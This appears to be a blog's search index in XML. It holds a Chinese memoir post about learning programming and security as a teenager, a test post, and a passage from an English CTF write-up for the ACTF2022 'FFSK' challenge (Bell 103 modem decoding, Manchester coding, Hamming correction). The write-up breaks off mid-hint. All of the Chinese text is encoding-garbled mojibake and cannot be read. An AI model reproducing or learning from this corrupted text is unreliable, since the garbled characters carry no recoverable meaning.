<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ™šå®‰ï¼Œç´«é‡‘æ¸¯</title>
      <link href="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/"/>
      <url>/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/</url>
      
        <content type="html"><![CDATA[<p>ç°åœ¨æ˜¯2023å¹´7æœˆ4æ—¥çš„å‡Œæ™¨ä¸¤ç‚¹ï¼ŒæŒ‰ç…§è®¡åˆ’æˆ‘åº”å½“è´Ÿè´£7.1-7.4çš„æ™šå®‰çŸ­ä¿¡â€”â€”ä½†æ¯•ç«Ÿç°åœ¨æ‰åŠ¨ç¬”ï¼Œåªèƒ½æ˜¯çˆ½çº¦äº†ï¼šæ€»ä¹‹ååˆ†æŠ±æ­‰ã€‚è‡³äºåŸå› â€¦â€¦æˆ‘ä¸çŸ¥é“ã€‚å¥½åƒç†¬å¤œè€ƒå®Œè¯•å°±ç©¿è¶Šåˆ°äº†è½°è¶´ï¼Œç†¬äº†ä¸ªå¤´ç—›çš„å¤œï¼Œå†å¤§ç¡ä¸€è§‰å°±åˆ°ç°åœ¨äº†ã€‚<br>ä¸è¿‡å››å¤©å¹¶åšä¸¤å¤©çš„è¯ï¼Œå¸Œæœ›èƒ½å†™ä¸€äº›ä¸æ˜¯åƒåœ¾è¯çš„é•¿æ–‡ï¼Œå¤§å®¶çœ‹ä¸ªå¼€å¿ƒå°±å¥½ã€‚<br>é‚£ä¹ˆä»Šå¤©æˆ‘æƒ³èŠèŠæˆ‘çš„ä»å‰ï¼ˆé«˜ä¸­å¾€å‰ï¼‰ï¼Œæƒ³èµ·å•¥å°±å†™å•¥å¥½äº†ã€‚  </p><blockquote><p>å¹´å°‘æ—¶è®¸å¤šçœ‹ä¼¼ä¸èµ·çœ¼çš„å°äº‹ï¼Œä½ ä»¥ä¸ºç®€å•é€‰æ‹©çš„å²”è·¯å£ï¼Œå…¶å®å¤šå¹´ä»¥åå¼ æœ›ï¼Œéƒ½ä¼šå‘ç°ï¼Œä¸ç»æ„é—´ï¼Œå®ƒç«Ÿç„¶æ”¹å˜ä½ å¾€åçš„äººç”Ÿã€‚  </p></blockquote><p>è¿™é¸¡æ±¤æ˜¯çœŸçš„åœŸï¼Œå¯æ˜¯å›å¤´çœ‹çœ‹å´æ˜¯çœŸåˆ‡æ— æ¯”ã€‚<br>å¥½äº†ï¼Œè‹¯å ¡ä¸‹é¢å¼€å§‹è¦figurativelyäºšä¸€ç‚¹ï¼ˆæ¢—æ¥æºï¼šå¤§ç ´è¿›å‡»&#x2F;å°ç ´ä¸å…¥æ¸ ï¼‰ã€‚  </p><h1 id="æˆ‘æ˜¯ï¼Ÿ"><a href="#æˆ‘æ˜¯ï¼Ÿ" class="headerlink" title="æˆ‘æ˜¯ï¼Ÿ"></a>æˆ‘æ˜¯ï¼Ÿ</h1><p>æˆ‘æ˜¯yyyï¼Œå› ä¸ºæˆ‘çš„åå­—ç¼©å†™å°±æ˜¯yyyã€‚<br>å¦‚æœä½ æƒ³è¦çœ‹æˆ‘çš„åšå®¢(A.K.A. é»‘å†å²)ï¼š<br><a href="http://cnblogs.com/yyy2015c01">http://cnblogs.com/yyy2015c01</a><br><a href="http://cubicy.icu/">http://cubicy.icu</a><br>é—®å°±æ˜¯æ²¡å¤‡æ¡ˆã€‚  </p><h1 id="è¿å¾™"><a href="#è¿å¾™" class="headerlink" title="è¿å¾™"></a>è¿å¾™</h1><p>æˆ‘æ¥è‡ªé—½ä¸œçš„ä¸‰çº¿å°åŸå¸‚ï¼Œä½†è¿™å‡ å¹´å› ä¸ºæŸå®¶ç”µæ± ä¼ä¸šçš„ç¼˜æ•…ï¼Œè¿™åº§åŸå¸‚è¿˜ç®—å°æœ‰åæ°”ã€‚<br>å®¶é•¿åœ¨å¾ˆå°çš„æ—¶å€™ä»¥ä¸å°çš„ä»˜å‡ºæŠŠæˆ‘å¸¦åˆ°äº†å¦é—¨ï¼Œæ¯ä¸Šä»æ­¤æ¯å‘¨å¾€è¿”ä¸¤åº§åŸå¸‚ï¼Œä¸€å¤´å·¥ä½œä¸€å¤´æ˜¯å®¶åº­â€”â€”æˆ‘è§‰å¾—é«˜é“åº”è¯¥ä¸ºå¥¹çš„å“è¶Šè´¡çŒ®å‘å¥–ã€‚<br>æ€»ä¹‹ï¼Œäº‹å®è¯æ˜è¿™æ˜¯æ— æ¯”æ­£ç¡®çš„ä¸€ä¸ªé€‰æ‹©ï¼Œæœ‰è¿œè§çš„çˆ¶æ¯ä»¬æ€»æ˜¯çŸ¥é“ï¼ˆæŠ‘æˆ–æ˜¯æ­ªæ‰“æ­£ç€ï¼‰å¤§åŸå¸‚ä¸ºå­©å­å¸¦æ¥çš„æ˜¯ä¸€ä¸ªå¥½å¾—å¤šçš„æœªæ¥ã€‚  </p><h1 id="ç¼–ç¨‹"><a href="#ç¼–ç¨‹" class="headerlink" title="ç¼–ç¨‹"></a>ç¼–ç¨‹</h1><p>å°å­¦çš„æ—¶å€™å› ä¸ºâ€œæ•°å­¦å¥½â€è¢«æ‹‰å»å­¦æ ¡ç¼–ç¨‹å°ç»„å­¦PC Logoå°æµ·é¾Ÿç”»å›¾äº†ã€‚ä¸çŸ¥é“å¤§ä¼™é‚£è¾¹æœ‰æ²¡æœ‰å‘¢ï¼Ÿ<br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/pclogo1.png" alt="PC Logo"><br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/pclogo2.png" alt="PC Logo2"><br>å°±æ˜¯ä¸çŸ¥é“å°å­¦çš„æˆ‘çŸ¥é“é•¿å¤§åé«˜è€ƒæ•°å­¦è¿˜æ²¡è¯­æ–‡é«˜ä¼šæœ‰å•¥æƒ³æ³•ã€‚<br>é‚£æ—¶å€™æœºæˆ¿è¿˜æ˜¯CRTæ˜¾ç¤ºå™¨ï¼Œè¿›æœºæˆ¿è¦ç©¿é‹å¥—â€¦â€¦æ®è¯´è¿™æ˜¯90åçš„ç»å†ï¼Ÿå¥½å§ï¼Œçš„ç¡®å¾ˆæ—©å°±æ¥è§¦äº†ç”µè„‘ã€‚<br>å¥½åƒæ˜¯æ•°å­¦è€å¸ˆåœ¨æŸä¸€ä¸ªå¹³å¸¸ä¸‹åˆæƒ³èµ·æ¥ä¸ºæˆ‘å¼•èçš„ï¼Ÿæ„Ÿè§‰äººç”Ÿè½¨è¿¹ä»æ­¤è¢«å½»åº•æ”¹å˜äº†ã€‚<br>å…­å¹´çº§å‚åŠ äº†å¸‚é‡Œçš„æ¯”èµ›ï¼Œè¿æ°”æ¯”è¾ƒå¥½æ‹¿åˆ°äº†å…¨å¸‚ç¬¬ä¸€ã€‚</p><blockquote><p>å¾—ï¼Œè¿™ä¸‹å½»åº•è¿›å‘äº†ã€‚â€”â€”ç¼–è€…æ³¨<br>ä½†æ˜¯å†æ€ä¹ˆæ ·ä¹Ÿæ¯”ç»ƒæ¢µå©€ç²è½»æ¾å¤šäº†ï¼Œä¸æ˜¯å—ï¼Ÿ</p></blockquote><p>é¡ºå¸¦ä¸€æï¼Œåæ¥åˆä¸­ä¸ºæˆ‘æå‰åœ¨æ ¡è®­ç»ƒåˆ†é…çš„å­¦å·æ˜¯æŒ‰è¿™æ¬¡æ¯”èµ›çš„åæ¬¡ç»™çš„ï¼Œåä¸º<code>2015c01</code>ï¼Œäºæ˜¯æˆ‘æŠŠä»–å½“ä½œè£èª‰ç§°å·æ‹¼è¿›äº†IDé‡Œâ€”â€”è¿™å°±æ˜¯<code>yyy2015c01</code>çš„ç”±æ¥ã€‚ç°åœ¨çœ‹æ¥è ¢åˆ°ä¸è¡Œã€‚ä½†æ˜¯äººä¸è£…é€¼æ´»ç€æœ‰ä»€ä¹ˆæ„æ€ï¼Ÿ  </p><h1 id="åˆä¸­"><a href="#åˆä¸­" class="headerlink" title="åˆä¸­"></a>åˆä¸­</h1><p>å…­å¹´çº§åˆ°åˆä¸­çš„è¿™æ®µæ—¶é—´æˆ‘è½¬è€Œå­¦ä¹ C++ï¼Œå‡†ç¡®çš„æ¥è¯´åº”è¯¥æ˜¯C with STLã€‚<br>äºæ˜¯æ¯é€¢æ”¾å­¦ä¾¿ç»„å›¢å†²å‘æœºæˆ¿ã€‚<br>äºæ˜¯åˆ«äººå†›è®­æ—¶æˆ‘åœ¨å¹ç©ºè°ƒï¼Œä¿¨ç„¶æ„Ÿè§‰è‡ªå·±æ˜¯äººä¸Šäººã€‚<br>äºæ˜¯è¿‡åº¦è†¨èƒ€çš„è‡ªä¿¡å¿ƒè®©æˆ‘åœ¨æ ¡å†…è¯„æµ‹ç½‘ç«™ä¸Šå’Œå­¦é•¿æ‰“å˜´ç‚®ï¼Œä¸€ä¸¾æˆåã€‚<br>åæ¥é‰´äºæˆ‘è®¤é”™æ€åº¦è‰¯å¥½ï¼Œé‚£ä¸ªç½‘ç«™çš„å­¦é•¿è®¸è¯ºæˆ‘è®¤çœŸå­¦ä¹ ä¾¿èµäºˆ<code>ç®¡ç†å‘˜</code>å°Šè´µèº«ä»½ã€‚<br>æˆ‘é€‰æ‹©è·Ÿéšä»–ï¼Œåœ¨çšˆä¾è€…ç‹‚çƒ­çš„é©±åŠ¨ä¸‹ç”¨Notepad++è·Ÿç€å†™PHPã€MySQLâ€¦â€¦è¿™æˆ–è®¸å°±æ˜¯æˆ‘çš„Webå¯è’™ï¼Ÿ<br><del>åœ¨ä¸€æœºæˆ¿äººè¢«é¢˜ç›®æŠ˜ç£¨çš„ä¸æ¸…æ—¶ï¼Œæˆ‘å¶å°”ä¼šæ»¥ç”¨èŒæƒæŠŠé¢˜ç›®æ•°æ®æ”¹æ°´äº†</del><br>åæ¥ï¼Œè¿™ä½å­¦é•¿å‘æˆ‘ä¼ æ•™ä¸œèˆ°Lä¸‰å¤§æ•™ï¼ˆæ±æ–¹Projectã€è‰¦éšŠã“ã‚Œãã—ã‚‡ã‚“ã€Œè‰¦ã“ã‚Œã€ã€Love Live!ã€Œãƒ©ãƒ–ãƒ©ã‚¤ãƒ–ï¼ã€ï¼‰ï¼Œäºæ˜¯ä»æ­¤ä»¥åæ—¶å¸¸å’Œå¦¹å­æˆ–è€…ç”·åŒå­¦ä¸­åˆç¿»è¿›æœºæˆ¿ç©è‰¦ã“ã‚Œï¼ˆè¿™ç»å†ç°åœ¨çœ‹çœ‹å¤šå°‘æœ‰ç‚¹å¥‡å¦™æ·±åˆ»äº†ï¼‰ã€‚<br>è¿™ä½å­¦é•¿çš„åˆä½œä¼™ä¼´å‘æˆ‘è®²è¿°MySQLæ³¨å…¥ç­‰åŸºç¡€çš„å®‰å…¨çŸ¥è¯†ï¼Œè¿™æˆ–è®¸å°±æ˜¯æˆ‘çš„ä¿¡æ¯å®‰å…¨å¯è’™ï¼Ÿ </p><blockquote><p>å…¶å®å¯èƒ½ä¸æ˜¯ã€‚å°å­¦ä¸ºäº†ä»å®¶é•¿æ‰‹ä¸Šæ‹¿åˆ°iPadå¯†ç ï¼Œç”¨æ©¡çš®æ“¦æ“¦å±å¹•ç•™ä¸‹ç™½å°ï¼Œå†è®©å®¶é•¿è§£é”è§‚å¯ŸæŒ‡çº¹ä½ç½®ï¼Œç„¶åæ’åˆ—ç»„åˆäº†ä¸¤æ¬¡å°±æ‹¿åˆ°äº†PINï¼ˆä»€ä¹ˆç¤¾å·¥ï¼‰ã€‚</p></blockquote><p>â€¦â€¦ä½ çŸ¥é“çš„ï¼Œæ¯ä¸ªå†™ç¨‹åºçš„å¤§ç”·å­©éƒ½æœ‰ä¸ªéª‡å®¢æ¢¦â€”â€”è¿™äº›å¤§ç”·å­©ä¸å‡ºæ„å¤–çš„å…ˆæˆäº†è„šæœ¬å°å­ã€‚<br>è¿™äº›ä¸œè¥¿æœªæ›¾ä¸¢å¤±è¿‡ï¼Œæˆ‘ç”šè‡³ç°åœ¨å°±èƒ½ç¿»å‡ºæ¥å½“æ—¶ç©çš„LOICâ€¦â€¦è™½ç„¶æœ€æ­£ç»çš„ç”¨é€”æ˜¯ç»™è€å¸ˆå­¦æ ¡ä¸»é¡µåˆ·è®¿é—®é‡ã€‚<br><img src="/2023/07/04/%E6%99%9A%E5%AE%89%EF%BC%8C%E7%B4%AB%E9%87%91%E6%B8%AF/LOIC.png" alt="LOIC">  </p><blockquote><p>æ•°æ®ä¸ä¸¢å¤±å¤šäºäº†æˆ‘ä»å°å­¦å¼€å§‹æ‰§è¡Œçš„æ•°æ®å¤‡ä»½3-2-1åŸåˆ™ï¼Œè™½ç„¶é‚£æ—¶çš„â€œå¼‚åœ°â€å¯¹æˆ‘æ¥è®²å¯èƒ½åªæ˜¯ä¸¤ä¸ªä¸åŒæˆ¿é—´å§â€¦â€¦  </p></blockquote><p>å“¦æˆ‘æ˜¯ä¸æ˜¯å¿˜è¯´äº†ï¼Œé‚£ä¸ªç½‘ç«™è®¸å¤šOIerï¼ˆè‡ªç§°ï¼‰å¬è¿‡ç”¨è¿‡ï¼šå°±æ˜¯<a href="https://www.luogu.com.cn/">æ´›è°·</a>ã€‚ä»æ—©å¹´ä¸¤ä¸ªäººè·¯è¾¹å‘é»‘ç™½ä¼ å•ä¸€è·¯åšåˆ°ä»Šå¤©çš„è§„æ¨¡ç€å®ä»¤äººæ•¬ä½©ã€‚  </p><h3 id="ç•ªå¤–ï¼šè€äºŒåˆºèˆäº†"><a href="#ç•ªå¤–ï¼šè€äºŒåˆºèˆäº†" class="headerlink" title="ç•ªå¤–ï¼šè€äºŒåˆºèˆäº†"></a>ç•ªå¤–ï¼šè€äºŒåˆºèˆäº†</h3><p>é‚£æ—¶å€™å¼€å§‹åœ¨bç«™è¿½ç•ªâ€”â€”ç”šè‡³è¹­çš„å°åŒºç‰©ä¸šWiFiã€‚å½“æ—¶Aç«™è¿˜æ´»ç€ï¼Œé€¸å¸ä¹Ÿåœ¨ä½ï¼Œæˆ‘åœ¨å‡ ç™¾KB&#x2F;sçš„ç½‘é€Ÿä¸‹åŠªåŠ›ä¸ºå¾¡å‚ç¾ç´åˆ·ç€â€œä½ æŒ‡å°–è·ƒåŠ¨çš„ç”µå…‰æ˜¯æˆ‘æ­¤ç”Ÿä¸ç­çš„ä¿¡ä»°â€è¿™ç§æ¯”â€œç«‹äºæµ®åä¹‹ä¸–ï¼Œå¥å“å¤©ç±ä¹‹éŸ³â€è¿˜ä¸­äºŒçš„å¼¹å¹•ã€‚<br>å¥½å§ï¼Œæˆ‘è¿˜æŒºæ€€å¿µçš„â€”â€”å½“ç„¶ä¸æ˜¯æŒ‡å–§é—¹çš„è‰é¸£ä¸è¿‡æ—¶ç¬”è®°æœ¬æ€¼ç€æ¡Œé¢çš„æ‰¬å£°å™¨ï¼Œè¿‘çƒ­å¸¦çƒ­æµªä¸é™é¢‘å·¥ä½œçš„ä¸­å¤®å¤„ç†å™¨ã€‚  </p><h1 id="è’åºŸä¸è’è¯çš„é«˜ä¸­ç”Ÿæ´»-amp-ZJUæ‘¸é±¼è®°"><a href="#è’åºŸä¸è’è¯çš„é«˜ä¸­ç”Ÿæ´»-amp-ZJUæ‘¸é±¼è®°" class="headerlink" title="è’åºŸä¸è’è¯çš„é«˜ä¸­ç”Ÿæ´»&amp;ZJUæ‘¸é±¼è®°"></a>è’åºŸä¸è’è¯çš„é«˜ä¸­ç”Ÿæ´»&amp;ZJUæ‘¸é±¼è®°</h1><p>ç´¯äº†ï¼Œå¤©ä¹Ÿäº®äº†ã€‚æˆ‘æ˜å¤©ä¼šå†å›æ¥çš„ï¼<br>é™¤äº†ç­é‡Œgayçš„æ©æ€¨æƒ…ä»‡ï¼Œç‚’å¸å¤§å¤±è´¥ï¼Œè¿«çœŸçŸ­çº¿äº¤æ˜“å‘˜ï¼Œæ æ†ä¸­çº§é«˜æ‰‹ï¼Œ996ä¸“æ”»osuå’Œé›€é­‚çš„è¿«çœŸç®—æ³•ç«èµ›é€‰æ‰‹å¤–ä¹Ÿæ²¡å•¥å¥½è®²çš„å˜›ï¼<br>ä¸è¿‡åº”è¯¥è¿˜æ˜¯æ¯”å¤§éƒ¨åˆ†äººçš„é«˜ä¸­ç”Ÿæ´»ç¦»è°±çš„å¤šã€‚  </p><h1 id="æˆ‘æ˜¯ï¼Ÿ-1"><a href="#æˆ‘æ˜¯ï¼Ÿ-1" class="headerlink" title="æˆ‘æ˜¯ï¼Ÿ"></a>æˆ‘æ˜¯ï¼Ÿ</h1><p>æˆ‘æ˜¯å¹¸è¿çš„ï¼Œåœ¨æ¯ä¸ªå…³é”®æ—¶é—´èŠ‚ç‚¹éƒ½é‡åˆ°äº†å¯¹çš„äººæ¨æˆ‘ä¸€æŠŠï¼šæˆ–æ˜¯å¼€æ˜çš„å®¶é•¿ï¼Œæˆ–æ˜¯æˆäººä»¥æ¸”çš„å…ˆè¾ˆï¼›<br>åˆæˆ–è€…æˆ‘è¿˜æ˜¯è¢«å®¿å‘½æ”¯é…ç€çš„ï¼Œè¿™ç§å¹¸è¿åªæ˜¯æ¥è‡ªäºä¿¡æ¯å·®ï¼Œæ˜¯â€œéšè´è¶æ¶ˆé€çš„æ—§æ—¥çš„å¹»å½±â€ã€‚<br>ä¸è¿‡å³ä½¿æ˜¯åè€…ï¼Œå¯¹æˆ‘è€Œè¨€è‡³å¤šæ˜¯è¿˜åŸè®º&#x2F;å†³å®šè®ºï¼šæˆ‘å§‹ç»ˆç›¸ä¿¡è‡ªèº«çš„åŠªåŠ›ä¹Ÿæ˜¯å®¿å‘½çš„ä¸€éƒ¨åˆ†ã€‚<br>æ€»ä¹‹æˆ‘å…¶å®æ²¡å˜è¿‡ï¼Œå¦‚æœçœŸæœ‰thoughtcrimeæˆ‘æ—©è¯¥è¢«æªæ¯™ä¸€ä¸‡æ¬¡ï¼Œè®©æˆ‘æ›´å¥½åœ°å‹åˆ¶ä½è‡ªå·±çš„è¢«åŠ¨æ”»å‡»å‹äººæ ¼å§ã€‚<br>åƒè¿™ç¯‡è¡¥äº¤çš„æ™šå®‰çŸ­ä¿¡ä¸€æ ·ï¼Œæˆ‘å¾ˆæƒ­æ„§æ—¶å¸¸ä¸èƒ½å›åº”ä»–äººçš„æœŸå¾…ï¼Œæ‰€ä»¥å¸Œæœ›æ—¥åèƒ½ç”¨è‡ªå·±çš„åŠ›é‡åˆ›é€ è¿™ç§â€œå¹¸è¿â€ã€‚  </p><blockquote><p>æ´ã‚“ã§è¦‹ã›ã¾ã™ã€è‡ªåˆ†æ˜Ÿï¼â€”â€”æ˜Ÿè¦‹ç´”é‚£</p></blockquote><p>ä¹Ÿå¸Œæœ›æ‰€æœ‰åœ¨å±±åŒºé‡Œï¼Œåœ¨é«˜åŸä¸Šï¼Œå¤„åœ¨ä¿¡æ¯èŒ§æˆ¿é‡Œçš„äººå„¿èƒ½æ‹¥æœ‰çœ‹åˆ°æ¯”è‡ªå·±æ›´é«˜å¢ƒç•Œçš„å¹¸è¿å§ã€‚<br>ç°åœ¨æ˜¯4ç‚¹44åˆ†ï¼Œæˆ‘æ—¶å¸¸åœ¨ç´«é‡‘æ¸¯å……æ»¡é›¾æ°”è€Œå¯‚é™çš„å¤œé‡Œèƒ¡æ€ä¹±æƒ³ï¼›è¿™æ¬¡æˆ‘æŠŠå®ƒå†™å‡ºæ¥äº†è€Œå·²ã€‚å¤©äº®äº†ï¼Œæˆ‘ä¹Ÿè¯¥ç¡äº†ã€‚<br><strong>æ—©å®‰ï¼Œç´«é‡‘æ¸¯ã€‚æ™šå®‰ï¼Œç´«é‡‘æ¸¯ï¼</strong>  </p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ™šå®‰çŸ­ä¿¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>-è«æ™‚-å•æ¨äºº</title>
      <link href="/2023/07/03/hello-world/"/>
      <url>/2023/07/03/hello-world/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸ªæµ‹è¯•é¡µé¢ã€‚<br>åˆæ˜¯ä¸€ä¸ªæˆ‘çš„æ–°åšå®¢^_^å¸Œæœ›è¿™æ¬¡è®¤çœŸå¯¹å¾…ã€‚<br>æˆ‘æ˜¯æ æ ï¼<br><img src="/2023/07/03/hello-world/image.png" alt="Alt text"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Miao </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Foo </tag>
            
            <tag> Bar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACTF2022 - FFSK - Official WriteUp</title>
      <link href="/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/"/>
      <url>/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</url>
      
        <content type="html"><![CDATA[<h1 id="FFSK-WriteUp"><a href="#FFSK-WriteUp" class="headerlink" title="FFSK - WriteUp"></a>FFSK - WriteUp</h1><p><del>ä¼—æ‰€å‘¨çŸ¥æ­ªæ­ªæ­ªè‹±æ–‡å¾ˆçƒ‚æ±‚è½»å–·</del>  </p><h3 id="0-Intro"><a href="#0-Intro" class="headerlink" title="0. Intro"></a>0. Intro</h3><p>In the game period, only one team had solved this problem: MapleBacon, a genius team at the University of British Columbia. Iâ€™m happy about their praise, but after checking their solution I think what truly â€œimpressiveâ€ is their creativity and persistence.</p><p><strong>Strongly recommend reading their awesome solution: <a href="https://maplebacon.org/2022/06/actf-ffsk/">https://maplebacon.org/2022/06/actf-ffsk/</a></strong></p><p>FSK &#x3D; Frequency-shift keying.</p><p>FFSK &#x3D; Double FSK or Fast FSK, whatever.</p><p>This problem is designed to invite participants to have a look at <em>the principle of communication</em>. </p><h3 id="1-Description"><a href="#1-Description" class="headerlink" title="1. Description"></a>1. Description</h3><p>A journey to solve a misc problem always begins from a problem description. Hereâ€™s it:</p><blockquote><p>Iâ€™ve bought the <strong>second commercialÂ modem</strong>Â forÂ computers in a big city of the UK.</p><blockquote><p>æ¿€æƒ…æ¾æ¹ƒçš„çƒè¿·è¿·æ‹è¿™ä¸ªåœ°æ–¹ã€‚é‡ä¸Šçƒèµ›å­£ï¼Œé…’å§é‡Œçš„çƒ­æƒ…ã€å‘å–Šã€å•¤é…’ã€æ‘‡æ»šï¼Œè¶³çƒè®©è¿™ä¸ªåŸå¸‚å……æ»¡æ´»åŠ›å’Œå¸Œæœ›ã€‚<br>ä»ä¸‰ä¸‡è‹±å°ºçš„äº‘ç«¯æœ›å»ï¼Œå¾€æ—¥çš„ç”Ÿæ´»æˆäº†ä¸€ä¸ªé¥è¿œå¾®å°çš„åœ°å›¾ã€‚<br>é˜³å…‰æ˜åªšçš„æ—¥å­ï¼Œå¼€å§‹å‡ºå‘ï¼ŒåŒ—äº¬æ—¶é—´00:50 å¼€å§‹èµ·é£ï¼Œä¸€ä¸ªæ¢¦çš„è·ç¦»ï¼Œå°±å¯ä»¥åˆ°è¾¾è·å…°é˜¿å§†æ–¯ç‰¹ä¸¹ï¼ŒçŸ­æš‚åœç•™ä¹‹åï¼Œç„¶åè½¬æœºé£å¾€è‹±å›½<br>å—èˆªçš„é£æœºé…ç½®å®Œå¤‡ï¼Œå…¨ç¨‹å¯ä»¥å……ç”µï¼Œè¿˜æœ‰wifiï¼Œå½±è§†å±æœ‰é¢å‰æœ€æ–°çš„ç”µå½±ã€‚ç¡ç¡é†’é†’ï¼Œåœ¨é£æœºä¸Šè§…åˆ°ä¸€éƒ¨ã€ŠåŒ—äº¬çˆ±æƒ…æ•…äº‹ã€‹ï¼Œè®©æˆ‘åœ¨ä¸‰ä¸‡è‹±å°ºçš„ç©ºä¸­å“­çš„ç¨€é‡Œå“—å•¦ã€‚</p></blockquote></blockquote><p>Just Google it, and youâ€™ll realize what it means:</p><ul><li><p><strong>second commercialÂ modemâ†’Bell 103, corresponds with the file name â€œmodem.wavâ€</strong></p></li><li><p>a big city in the UK: <strong>Manchester</strong>, which refers to the famous coding method.</p></li><li><p>The source of the long Chinese paragraph: <a href="https://kknews.cc/zh-hk/travel/e6yjp34.html">https://kknews.cc/zh-hk/travel/e6yjp34.html</a></p><p>  It describes a trip to Manchester, which is indeed a big city in the UK.</p></li></ul><h3 id="2-Bell-103"><a href="#2-Bell-103" class="headerlink" title="2. Bell 103"></a>2. Bell 103</h3><p>Hereâ€™s an article that shows how the Bell 103 protocol works: <a href="https://vigrey.com/blog/emulating-bell-103-modem">https://vigrey.com/blog/emulating-bell-103-modem</a></p><p>So two key points need your attention. First, characters are stored in ASCII code and are <strong>little-endian;</strong> second, it has 2 channels for communication: one for the server-side(2025&#x2F;2225 Hz), and another for the client-side(1070&#x2F;1270 Hz).</p><p>You can also find it from the spectrogram of the .wav file.</p><h3 id="2-Server-channel"><a href="#2-Server-channel" class="headerlink" title="2. Server channel"></a>2. Server channel</h3><p>Using the <code>minimodem</code>tool (See MapleBaconâ€™s write-up) is functional.</p><p>Also, you can find some useful tools in GitHub: <a href="https://github.com/laurenschneider/audiodecoder">https://github.com/laurenschneider/audiodecoder</a></p><p>It may be a faster way. In fact, the <code>solve.py</code> is based on its code.</p><p>After all, youâ€™ll see this on the server channel:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HINT_Hamming@ddddPdddddddPdddPdPP(20).ECCode; Content: Why do you use such</span><br><span class="line">a slow method with a high Bit Error Ratio for communication? It took me a lot of</span><br><span class="line">effort to correct bit-flips, making sure the communication was less</span><br><span class="line">error-prone...that is 2 say, THE ORIGINAL PROTOCOL IS WRAPPED BY SOME OTHER</span><br><span class="line">TRANSFORMATIONS! Fortunately, we can now communicate properly on another channel</span><br><span class="line">while enjoying a vacation in this BIG CITY--I mean, IEEE 802.3.....Wait, what is</span><br><span class="line">the new protocol? Guess by yourself!</span><br></pre></td></tr></table></figure><h3 id="3-Client-channel"><a href="#3-Client-channel" class="headerlink" title="3. Client channel"></a>3. Client channel</h3><p>We can extract the bit string on this channel using the same method but just make some tweaks of frequency. Youâ€™ll get a bit string of 53640 bits.</p><p>Notice that the bit string contains only â€œ01â€ â€œ10â€, that is what <strong>Manchester is</strong> all about. The <code>IEEE 802.3</code>mentioned in the server channel message is actually to make sure you decode in the right way: there are 2 opposite ways to map 01&#x2F;10 to 1&#x2F;0, but what is widely used is defined in IEEE 802.3, which says â€œ01â€â†’1 and â€œ10â€â†’0</p><p>Then the key problem is to solve Hamming code. From the given information, youâ€™ll realize the block size is 20bits. Implement it by yourself or just Google&#x2F;GitHub&#x2F;StackOverflow it.</p><p>Find every â€œ1â€ bit in a block, XOR their <strong>positions</strong>, and magically you got the error bit position(0 if no error) which is a well-designed feature of Hamming code, then just flip the bit. </p><p>Actually, every block has, and only has an error bit: thatâ€™s an intended design to notify you that youâ€™re on the right way :)</p><h3 id="4-Final-Step"><a href="#4-Final-Step" class="headerlink" title="4. Final Step"></a>4. Final Step</h3><p>Now youâ€™ve got the cipher bit string: just applied Bell 103 decoder to it once again. </p><p>Itâ€™ll yield a string that starts with <code>data:image/png;base64,</code></p><p>An experienced CTFer will immediately put it into the browser (like what MapleBacon did). Or you can find a random online converter to recover this Base64-encoded image. Itâ€™s a QR Code. Scan it, and got the flag.</p><h3 id="5-Hints-Explanation"><a href="#5-Hints-Explanation" class="headerlink" title="5. Hints Explanation"></a>5. Hints Explanation</h3><ol><li><p><code>æ‰€æœ‰äººéƒ½è®¤ä¸ºï¼Œåƒé¸¡è›‹å‰ï¼ŒåŸå§‹çš„æ–¹æ³•æ˜¯æ‰“ç ´é¸¡è›‹è¾ƒå¤§çš„ä¸€ç«¯ã€‚å¯æ˜¯å½“ä»Šçš‡å¸çš„ç¥–çˆ¶ æ—¶å€™åƒé¸¡è›‹ï¼Œä¸€æ¬¡æŒ‰å¤æ³•æ‰“é¸¡è›‹æ—¶ç¢°å·§å°†ä¸€ä¸ªæ‰‹æŒ‡å¼„ç ´äº†ï¼Œå› æ­¤ä»–çš„çˆ¶äº²ï¼Œå½“æ—¶çš„çš‡å¸ï¼Œ å°±ä¸‹äº†ä¸€é“æ••ä»¤ï¼Œå‘½ä»¤å…¨ä½“è‡£æ°‘åƒé¸¡è›‹æ—¶æ‰“ç ´é¸¡è›‹è¾ƒå°çš„ä¸€ç«¯ï¼Œè¿ä»¤è€…é‡ç½šã€‚ è€ç™¾å§“ä»¬ 